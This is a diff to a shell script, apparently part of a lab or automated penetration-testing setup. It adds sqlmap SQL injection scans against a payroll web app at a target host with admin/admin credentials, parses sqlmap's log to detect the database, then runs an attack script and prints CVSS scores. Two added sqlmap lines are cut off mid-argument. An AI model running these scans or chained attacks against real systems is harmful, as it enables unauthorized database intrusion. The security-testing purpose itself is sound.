@@ -10,8 +10,17 @@ then
 	# in command shell run command background and then enter y
 	SERVER=$(cat results.txt | cut -d'/' -f 5 | cut -d'.' -f 2)
 	rm results.txt
-	time ./attack-script.sh $TARGET mysql $SERVER
-	#time ./attack-script.sh $TARGET postgresql $SERVER
+	if [ $SERVER == "php" ]
+	then	
+		sqlmap -u http://$TARGET/payroll_app.php --data="user=admin&password=admin&s=OK"
+	elif [ $SERVER == "py" ]
+	then 
+		sqlmap -u http://$TARGET/cgi-bin/payroll_app.py --data="user=admin&password=admin&s=OK"
+	fi
+	tail -n 1 /root/.sqlmap/output/192.168.0.122/log >> dbres.txt
+	DATABASE=$(cat dbres.txt | cut -d" " -f3 | tr '[:upper:]' '[:lower:]') 
+	rm dbres.txt
+	time ./attack-script.sh $TARGET $DATABASE $SERVER
 	echo "baseScore_V2: 10"
 	echo "severity_V2: HIGH"
 	echo "exploitabilityScore_V2: 10"
@@ -21,8 +30,17 @@ then
 	# in command shell run command background and then enter y
         SERVER=$(cat results.txt | cut -d'/' -f 5 | cut -d'.' -f 2)
         rm results.txt
-        time ./attack-script.sh $TARGET mysql $SERVER
-        # time ./attack-script.sh $TARGET postgresql $SERVER
+	if [ $SERVER == "php" ]
+        then
+                sqlmap -u http://$TARGET/payroll_app.php --data="user=admin&password=admin&s=OK"
+        elif [ $SERVER == "py" ]
+        then 
+                sqlmap -u http://$TARGET/cgi-bin/payroll_app.py --data="user=admin&password=admi$
+        fi
+        tail -n 1 /root/.sqlmap/output/192.168.0.122/log >> dbres.txt
+        DATABASE=$(cat dbres.txt | cut -d" " -f3 | tr '[:upper:]' '[:lower:]') 
+        rm dbres.txt
+        time ./attack-script.sh $TARGET $DATABASE $SERVER
 	echo "baseScore_V2: 7.5"
 	echo "severity_V2: HIGH"
 	echo "exploitabilityScore_V2: 10"
@@ -32,8 +50,17 @@ then
 	# in command shell run command background and then enter y
         SERVER=$(cat results.txt | cut -d'/' -f 5 | cut -d'.' -f 2)
         rm results.txt
-        time ./attack-script.sh $TARGET mysql $SERVER
-        # time ./attack-script.sh $TARGET postgresql $SERVER
+	if [ $SERVER == "php" ]
+        then
+                sqlmap -u http://$TARGET/payroll_app.php --data="user=admin&password=admin&s=OK"
+        elif [ $SERVER == "py" ]
+        then 
+                sqlmap -u http://$TARGET/cgi-bin/payroll_app.py --data="user=admin&password=admi$
+        fi
+        tail -n 1 /root/.sqlmap/output/192.168.0.122/log >> dbres.txt
+        DATABASE=$(cat dbres.txt | cut -d" " -f3 | tr '[:upper:]' '[:lower:]') 
+        rm dbres.txt
+        time ./attack-script.sh $TARGET $DATABASE $SERVER
 	echo "baseScore_V2: 7.5"
 	echo "severity_V2: HIGH"
 	echo "exploitabilityScore_V2: 10"
